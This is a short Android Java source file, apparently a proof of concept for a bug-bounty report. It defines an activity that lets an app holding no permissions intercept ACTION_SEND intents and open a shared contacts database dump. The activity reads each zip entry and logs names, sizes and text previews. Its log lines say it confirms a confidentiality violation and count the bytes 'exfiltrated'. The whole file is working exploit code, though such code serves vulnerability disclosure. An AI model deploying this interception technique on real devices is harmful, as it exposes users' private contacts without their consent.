package com.vrp.zeroperm;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.InputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class DumpReceiverActivity extends Activity {
    private static final String T = "DUMP_RECEIVER";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== DumpReceiverActivity: Intercepted ACTION_SEND ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " ZERO PERMISSIONS");

        Intent intent = getIntent();
        if (intent == null) {
            Log.w(T, "[-] No intent");
            finish();
            return;
        }

        Log.w(T, "Action: " + intent.getAction());
        Log.w(T, "Type: " + intent.getType());

        Uri streamUri = intent.getParcelableExtra(Intent.EXTRA_STREAM);
        if (streamUri == null) {
            Log.w(T, "[-] No EXTRA_STREAM URI");
            finish();
            return;
        }

        Log.w(T, "[!!!] GOT DUMP URI: " + streamUri);

        try {
            InputStream is = getContentResolver().openInputStream(streamUri);
            if (is == null) {
                Log.w(T, "[-] openInputStream returned null");
                finish();
                return;
            }

            Log.w(T, "[!!!] SUCCESSFULLY OPENED CONTACTS DUMP STREAM");
            ZipInputStream zis = new ZipInputStream(is);
            ZipEntry entry;
            int fileCount = 0;
            long totalBytes = 0;

            while ((entry = zis.getNextEntry()) != null) {
                fileCount++;
                long size = 0;
                byte[] buf = new byte[4096];
                int n;
                StringBuilder preview = new StringBuilder();
                while ((n = zis.read(buf)) > 0) {
                    size += n;
                    if (preview.length() < 500) {
                        for (int i = 0; i < n && preview.length() < 500; i++) {
                            char c = (char) (buf[i] & 0xFF);
                            if (c >= 32 && c < 127) preview.append(c);
                        }
                    }
                }
                totalBytes += size;
                Log.w(T, "[!!!] ZIP ENTRY: " + entry.getName() + " (" + size + " bytes)");
                if (preview.length() > 0) {
                    Log.w(T, "[!!!] PREVIEW: " + preview.toString().substring(0, Math.min(200, preview.length())));
                }
                zis.closeEntry();
            }

            zis.close();
            is.close();

            Log.w(T, "[!!!] ========================================");
            Log.w(T, "[!!!] CONFIDENTIALITY VIOLATION CONFIRMED");
            Log.w(T, "[!!!] Total files in dump: " + fileCount);
            Log.w(T, "[!!!] Total bytes exfiltrated: " + totalBytes);
            Log.w(T, "[!!!] Zero-perm app read ENTIRE contacts database!");
            Log.w(T, "[!!!] ========================================");

        } catch (Exception e) {
            Log.w(T, "[-] Error reading dump: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            e.printStackTrace();
        }

        finish();
    }
}
